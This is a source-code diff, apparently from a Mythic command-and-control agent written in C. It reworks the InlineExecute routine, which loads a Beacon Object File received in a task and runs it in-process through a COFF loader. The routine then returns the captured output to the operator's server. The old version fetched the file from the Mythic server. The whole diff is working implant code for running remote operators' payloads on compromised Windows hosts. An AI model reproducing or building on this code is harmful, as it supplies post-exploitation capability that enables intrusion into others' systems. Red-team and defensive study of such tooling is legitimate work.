@@ -248,7 +248,7 @@ BOOL RunCOFF(char* FileData, DWORD* DataSize, char* EntryName, char* argumentdat
 
 
 /**
- * @brief Fetch and execute BOF in current process thread.
+ * @brief Execute a Beacon Object File in current process thread.
  * 
  * @param[in] taskUuid Task's UUID
  * @param[inout] arguments PARSER struct containing task data.
@@ -256,62 +256,63 @@ BOOL RunCOFF(char* FileData, DWORD* DataSize, char* EntryName, char* argumentdat
  */
 VOID InlineExecute(PCHAR taskUuid, PPARSER arguments)
 {
-    /* Parse BOF arguments */
+    /* Parse command arguments */
     UINT32 nbArg = ParserGetInt32(arguments);
-    _dbg("GOT %d arguments for BOF", nbArg);
+    _dbg("GOT %d arguments", nbArg);
 
-    DWORD  status;
-    SIZE_T uuidLen   = 0;
-    SIZE_T argLen    = 0;
-    DWORD  filesize  = 0;
-    BOF_UPLOAD bof   = { 0 };
-
-    PCHAR  fileUuid  = ParserGetString(arguments, &uuidLen);
-    PCHAR  bofArgs   = ParserGetString(arguments, &argLen);
-
-    strncpy(bof.fileUuid, fileUuid, TASK_UUID_SIZE + 1);
-    bof.fileUuid[TASK_UUID_SIZE + 1] = '\0';
-
-
-    /* Fetch BOF file from Mythic */
-    if (status = MythicGetFileBytes(taskUuid, &bof) != 0)
+    if ( nbArg < 2 )
     {
-        _err("Failed to fetch BOF file from Mythic server.");
-        PackageError(taskUuid, status);
+        _err("Invalid number of arguments");
+        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
+        return;
+    }
+
+    PCHAR  BofData   = NULL;
+    PCHAR  BofArgs   = NULL;
+    SIZE_T bofLen    = 0;
+    SIZE_T argLen    = 0;
+
+    /* Get BOF and Arguments */
+    BofArgs = ParserGetString(arguments, &argLen);
+    BofData = ParserGetString(arguments, &bofLen);
+
+    if ( BofData == NULL || bofLen == 0 )
+    {
+        _err("Invalid BOF data");
+        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
         return;
     }
 
     /* Execute the BOF with pre-packed arguments */
-    filesize = bof.size;
-    if (!RunCOFF(bof.buffer, &filesize, "go", bofArgs, argLen)) {
-		_err("Failed to execute BOF in current thread.");
-        LocalFree(bof.buffer);
+    if ( !RunCOFF(BofData, &bofLen, "go", BofArgs, argLen) ) 
+    {
+        _err("Failed to execute BOF in current thread.");
         PackageError(taskUuid, ERROR_MYTHIC_BOF);
         return;
-	}
+    }
 
-    /* Read output from Global */
-    PCHAR outdata = NULL;
-	int outdataSize = 0;
-    outdata = BeaconGetOutputData(&outdataSize);
-	if (outdata == NULL) {
+    /* Read output from Global Beacon Output Buffer */
+    PCHAR OutData = NULL;
+	INT   OutSize = 0;
+    
+    OutData       = BeaconGetOutputData(&OutSize);
+
+	if ( OutData == NULL || OutSize == 0 ) 
+    {
         _err("Failed get BOF output");
-        LocalFree(bof.buffer);
         PackageError(taskUuid, ERROR_MYTHIC_BOF);
         return;
 	}
 
-    PPackage data = PackageInit(0, FALSE);
-    PackageAddString(data, outdata, FALSE);
+    PPackage locals = PackageInit(0, FALSE);
+    PackageAddString(locals, OutData, FALSE);
     
     // Success
-    PackageComplete(taskUuid, data);
+    PackageComplete(taskUuid, locals);
 
 // Cleanup
-    free(outdata);                  // allocated in BeaconOutput()
-    LocalFree(bof.buffer);          // allocated in MythicGetFileBytes()
-    bof.buffer = NULL;
-    PackageDestroy(data);
+    free(OutData);                  // allocated in BeaconOutput()
+    PackageDestroy(locals);
 }
 
 #endif  //INCLUDE_CMD_INLINE_EXECUTE
